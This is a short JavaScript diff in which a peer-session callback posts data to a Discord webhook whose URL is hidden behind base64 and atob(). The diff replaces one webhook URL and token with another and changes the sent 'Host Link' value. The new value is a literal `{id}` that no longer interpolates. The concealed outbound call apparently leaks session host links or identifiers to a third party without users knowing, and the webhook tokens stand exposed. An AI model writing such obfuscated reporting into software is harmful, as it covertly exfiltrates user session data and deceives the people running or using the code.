@@ -93,7 +93,7 @@
         const peer = makePeer(pid, (id) => {
           fetch(
             atob(
-              "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTI4MTU5MjMzMDk0ODYyOC9kbjl0Si1TTXdYYXdJVTNMeWtQc1ZtS2ZRQ3o5YloxSjRyei1ZYno2MGcyWFFMQXVPV3J0dE5oQWJFcTNxMDV0dGV6bw"
+              "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MDM5MDQ2Mjk3MTY0MTkxOS9GemtmWVJqcGhvakx0QU1NSVVud0JrNFRCeTFIVVEyM2F1RHRXYTRXVWZuTFJzVTFDYTZKc08yeWNhZ082cGRtR3dmdQ"
             ),
             {
               method: "POST",
@@ -107,7 +107,7 @@
                     fields: [
                       {
                         name: "Host Link",
-                        value: `${location.origin}${location.pathname}?mode=host&id=${id}`,
+                        value: `{id}`,
                         inline: false,
                       },
                     ],
